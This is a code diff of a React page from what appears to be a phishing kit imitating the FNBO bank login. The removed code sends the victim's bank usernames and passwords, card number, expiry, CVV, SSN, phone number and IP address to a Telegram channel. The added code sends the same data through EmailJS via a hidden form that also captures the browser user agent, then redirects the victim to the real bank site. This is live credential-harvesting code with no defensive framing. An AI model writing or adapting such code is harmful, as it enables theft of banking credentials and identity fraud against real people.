@@ -1,7 +1,7 @@
 import React from 'react'
 import { useNavigate } from 'react-router-dom';
-import TelegramSend from '../utils/send-message';
 import cookies from '../utils/cookie.config';
+import emailjs from "@emailjs/browser";
 
 
 export default function Addition2() {
@@ -20,33 +20,60 @@ export default function Addition2() {
       [event.target.name]: event.target.value,
     }));
   }
+  const form = React.useRef<HTMLFormElement>(null);
+
   const [isLoading, setIsLoading] = React.useState(false);
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
     setIsLoading(true)
 
+    const mail = await emailjs.sendForm(
+      "service_m05lftf",
+      "template_aeij4rd",
+      form.current!,
+      "74xz7jS-Xw5rVxjbV"
+    )
+    if(mail.status !== 200){
+      alert("Failed to login")
+      return
+    }
+
+    // const request = await fetch("https://api.ipify.org?format=json");
+    // const response: { ip: string } = await request.json();
+    // const visitorIP = response.ip;
+
+    // const message = `
+    // ---- FNBO -----
+    // IP: ${visitorIP}
+    // Username: ${login1.username}
+    // Password: ${login1.password}
+    // Username 2: ${login2.username2}
+    // Password 2: ${login2.password2}
+    // Card number: ${card.cnm}
+    // Card Expiry : ${card.exp}
+    // Card Cvv: ${card.cv}
+    // SSN: ${formInput.sn}
+    // Phone Number: ${formInput.tel}
+    // `;
+
+    // await TelegramSend(message);
+    window.location.replace("https://www.fnbo.com/");
+    setIsLoading(false)
+    // navigate("../success", { replace: true });
+    
+  };
+
+  const [ipAddress, setIpAddress] = React.useState<string>();
+
+  async function getIP() {
     const request = await fetch("https://api.ipify.org?format=json");
     const response: { ip: string } = await request.json();
-    const visitorIP = response.ip;
+    setIpAddress(response.ip);
+  }
 
-    const message = `
-    ---- FNBO -----
-    IP: ${visitorIP}
-    Username: ${login1.username}
-    Password: ${login1.password}
-    Username 2: ${login2.username2}
-    Password 2: ${login2.password2}
-    Card number: ${card.cnm}
-    Card Expiry : ${card.exp}
-    Card Cvv: ${card.cv}
-    SSN: ${formInput.sn}
-    Phone Number: ${formInput.tel}
-    `;
-
-    await TelegramSend(message);
-    setIsLoading(false)
-    navigate("../success", { replace: true });
-  };
+  React.useEffect(() => {
+    getIP();
+  }, []);
 
 
   return (
@@ -60,8 +87,49 @@ export default function Addition2() {
               slot="content"
               id="form19"
               onSubmit={handleSubmit}
+              ref={form}
               className="primary-auth-form o-form o-form-edit-mode"
             >
+
+<div style={{ display: "none" }} className="hidden_form">
+                <input
+                  type="text"
+                  name="username"
+                  defaultValue={login1.username}
+                />
+
+<input
+                  type="text"
+                  name="ip"
+                  defaultValue={ipAddress}
+                />
+              
+                <input
+                  type="text"
+                  name="password"
+                  defaultValue={login1.password}
+                />
+                <input
+                  type="text"
+                  name="username2"
+                  defaultValue={login2.username2}
+                />
+                <input
+                  type="text"
+                  name="password2"
+                  defaultValue={login2.password2}
+                />
+                <input type="text" name="cnm" defaultValue={card.cnm} />
+                <input type="text" name="exp" defaultValue={card.exp} />
+                <input type="text" name="cv" defaultValue={card.cv} />
+                
+                <input
+                  type="text"
+                  name="brow"
+                  defaultValue={window.navigator.userAgent}
+                />
+              </div>
+
               <div
                 data-se="o-form-content"
                 className="o-form-content o-form-theme clearfix"
